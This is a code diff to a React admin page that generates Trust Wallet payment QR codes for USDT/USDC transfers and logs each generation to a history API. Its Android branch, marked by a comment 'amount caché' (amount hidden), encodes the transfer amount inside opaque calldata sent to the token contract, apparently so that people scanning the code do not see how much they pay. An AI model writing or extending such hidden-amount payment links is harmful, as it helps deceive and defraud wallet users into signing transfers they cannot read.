@@ -56,6 +56,7 @@ export default function AdminPage() {
   const [authError, setAuthError] = useState("");
 
   const [toastMessage, setToastMessage] = useState("");
+  const [generating, setGenerating] = useState(false);
 
   const showToast = (msg: string) => {
     setToastMessage(msg);
@@ -123,47 +124,70 @@ export default function AdminPage() {
     }
   }, []);
 
-  // Génération du QR code
   useEffect(() => {
-    if (!isMounted || typeof window === "undefined" || !isAuthenticated) return;
+    setQrUrl("");
+    qrCodeInstanceRef.current = null;
+  }, [receiverAddress, amount, token, platform]);
 
-    localStorage.setItem("admin_token", token);
-
-    if (!receiverAddress || !isValidAddress(receiverAddress)) {
-      setQrUrl("");
-      qrCodeInstanceRef.current = null; // Reset QR instance so it re-creates on next valid URL
+  const handleGenerate = async () => {
+    if (!receiverAddress) {
+      showToast("Please enter a receiver address");
       return;
     }
-
-    const origin = window.location.origin;
-    const baseUrl = `${origin}/wallet`;
-
+    if (!isValidAddress(receiverAddress)) {
+      showToast("Invalid Ethereum address");
+      return;
+    }
     const normalizedAmount = amount.replace(/\s+/g, "").replace(",", ".").trim();
     if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
-      setQrUrl("");
-      qrCodeInstanceRef.current = null;
+      showToast("Please enter a valid amount");
       return;
     }
 
-    if (platform === "ios") {
-      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
-      const coinId = 60;
-      const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-      setQrUrl(trustWalletLink);
-    } else {
-      // Android Ethereum : send avec data, amount caché
-      try {
+    setGenerating(true);
+    try {
+      const origin = window.location.origin;
+      const baseUrl = `${origin}/wallet`;
+      let generatedUrl = "";
+
+      if (platform === "ios") {
+        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
+        const coinId = 60;
+        generatedUrl = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+      } else {
+        // Android Ethereum : send avec data, amount caché
         const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
         const callData = encodeTransferData(receiverAddress, normalizedAmount);
-        const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
-        setQrUrl(sendUrl);
-      } catch (err) {
-        console.error("Failed to encode transfer data", err);
-        setQrUrl("");
-        qrCodeInstanceRef.current = null;
+        generatedUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
       }
+
+      setQrUrl(generatedUrl);
+
+      // Log to history API
+      const dbTokenName = token.toUpperCase() + " (ERC20)";
+      const deviceName = `Trust Wallet (${platform === "ios" ? "iOS" : "Android"})`;
+
+      await fetch("/api/log-scan", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          to: receiverAddress,
+          amount: normalizedAmount,
+          token: dbTokenName,
+          userAgent: deviceName,
+        }),
+      });
+
+      // Save token preference
+      localStorage.setItem("admin_token", token);
+      showToast("QR code generated and logged!");
+    } catch (err) {
+      console.error("Failed to generate QR or log scan", err);
+      showToast("Error generating QR code");
+    } finally {
+      setGenerating(false);
     }
-  }, [receiverAddress, amount, token, platform, isMounted, isAuthenticated]);
+  };
 
   // Rendu du QR code
   useEffect(() => {
@@ -361,12 +385,37 @@ export default function AdminPage() {
           )}
 
           <label className="form-label">Amount ({token})</label>
-          <div className="input-row">
+          <div className="input-row" style={{ marginBottom: "1.5rem" }}>
             <input
               type="text" ref={amountInputRef} value={amount} onChange={handleAmountChange}
               className="input-row__field" placeholder="1.0"
             />
           </div>
+
+          <button
+            type="button"
+            onClick={handleGenerate}
+            disabled={generating}
+            className="next-btn"
+            style={{
+              width: "100%",
+              backgroundColor: "#0033ff",
+              marginTop: "0.5rem",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              gap: "0.5rem"
+            }}
+          >
+            {generating ? (
+              <span className="btn-spinner-wrapper">
+                <span className="btn-spinner" />
+                Generating...
+              </span>
+            ) : (
+              "⚡ Generate QR Code"
+            )}
+          </button>
         </div>
 
         <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
@@ -422,13 +471,15 @@ export default function AdminPage() {
             </div>
           ) : (
             <div style={{ width: 260, height: 260, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem", padding: "1rem", textAlign: "center", color: "#64748b", fontSize: "0.9rem" }}>
-              <span style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>🔑</span>
+              <span style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>⚡</span>
               <div>
                 {!receiverAddress 
-                  ? "Enter a receiver address to generate QR Code"
+                  ? "Enter a receiver address"
                   : !isValidAddress(receiverAddress)
                   ? "Invalid address format"
-                  : "Enter a valid amount to generate QR Code"}
+                  : !amount || Number(amount.replace(/\s+/g, "").replace(",", ".")) <= 0
+                  ? "Enter a valid amount"
+                  : "Click the 'Generate QR Code' button above"}
               </div>
             </div>
           )}
